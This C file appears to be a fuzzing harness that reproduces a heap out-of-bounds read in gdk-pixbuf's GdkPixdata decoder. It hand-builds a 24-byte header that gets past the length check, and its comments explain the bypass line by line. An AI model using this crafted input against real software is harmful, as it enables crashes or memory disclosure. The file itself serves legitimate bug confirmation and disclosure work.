/*
 * VULN-001 Direct Harness: GdkPixdata RAW decoder heap OOB read
 *
 * Calls gdk_pixdata_deserialize() + gdk_pixbuf_from_pixdata() with
 * a precisely 24-byte allocation so ASAN catches the 3-byte OOB read
 * at pixdata->pixel_data (= buf+24, one past end).
 *
 * Compile:
 *   gcc -o harness_001 harness_001.c \
 *       -fsanitize=address \
 *       $(PKG_CONFIG_PATH=/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/lib/pkgconfig \
 *         pkg-config --cflags --libs gdk-pixbuf-2.0) \
 *       -I/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/include/gdk-pixbuf-2.0 \
 *       -I/usr/include/glib-2.0 -I/usr/lib/x86_64-linux-gnu/glib-2.0/include \
 *       -L/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/lib \
 *       -Wl,-rpath,/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/lib
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <glib.h>
#include <gdk-pixbuf/gdk-pixbuf.h>
#include <gdk-pixbuf/gdk-pixdata.h>

/* GdkPixdata header: all big-endian uint32 */
static uint8_t craft_gdkp(uint8_t *buf, size_t bufsize)
{
    /* magic = "GdkP" = 0x47646b50 */
    buf[0] = 0x47; buf[1] = 0x64; buf[2] = 0x6b; buf[3] = 0x50;
    /* length = 24 (no pixel data → triggers bypass) */
    buf[4] = 0x00; buf[5] = 0x00; buf[6] = 0x00; buf[7] = 0x18;
    /* pixdata_type = 0x01010001 (RGB, RAW, 8-bit) */
    buf[8] = 0x01; buf[9] = 0x01; buf[10] = 0x00; buf[11] = 0x01;
    /* rowstride = 3 */
    buf[12] = 0x00; buf[13] = 0x00; buf[14] = 0x00; buf[15] = 0x03;
    /* width = 1 */
    buf[16] = 0x00; buf[17] = 0x00; buf[18] = 0x00; buf[19] = 0x01;
    /* height = 1 */
    buf[20] = 0x00; buf[21] = 0x00; buf[22] = 0x00; buf[23] = 0x01;
    /* no pixel_data bytes */
    return 0;
}

int main(int argc, char *argv[])
{
    GdkPixdata pixdata;
    GdkPixbuf  *pixbuf;
    GError     *error = NULL;
    int         ret = 0;

    /* Allocate EXACTLY 24 bytes so ASAN redzones immediately follow */
    uint8_t *buf = g_malloc(24);
    craft_gdkp(buf, 24);

    fprintf(stderr, "[*] Calling gdk_pixdata_deserialize() with 24-byte buffer...\n");

    /*
     * Bounds check in gdk_pixdata_deserialize (line 235):
     *   if (stream_length < pixdata->length - GDK_PIXDATA_HEADER_LENGTH)
     *   => 24 < 24 - 24 = 0  => FALSE  => bypassed
     *
     * pixdata->pixel_data = stream + 24 (one past end of 24-byte buf)
     */
    if (!gdk_pixdata_deserialize(&pixdata, 24, buf, &error)) {
        fprintf(stderr, "[-] gdk_pixdata_deserialize() failed: %s\n",
                error ? error->message : "unknown");
        g_clear_error(&error);
        g_free(buf);
        return 1;
    }

    fprintf(stderr, "[+] Deserialize succeeded (bounds check bypassed).\n");
    fprintf(stderr, "    pixel_data ptr = buf + 24 (one past end of 24-byte allocation)\n");
    fprintf(stderr, "[*] Calling gdk_pixbuf_from_pixdata() — triggers memcpy OOB read...\n");

    /*
     * gdk_pixbuf_from_pixdata() line ~506:
     *   memcpy(data, pixdata->pixel_data, rowstride * height)
     *   => reads 3 bytes from buf+24  => ASAN: heap-buffer-overflow READ
     */
    pixbuf = gdk_pixbuf_from_pixdata(&pixdata, TRUE, &error);

    if (pixbuf == NULL) {
        fprintf(stderr, "[-] gdk_pixbuf_from_pixdata() failed: %s\n",
                error ? error->message : "unknown");
        g_clear_error(&error);
        ret = 1;
    } else {
        fprintf(stderr, "[+] gdk_pixbuf_from_pixdata() returned (OOB read without ASAN detection).\n");
        g_object_unref(pixbuf);
    }

    g_free(buf);
    return ret;
}
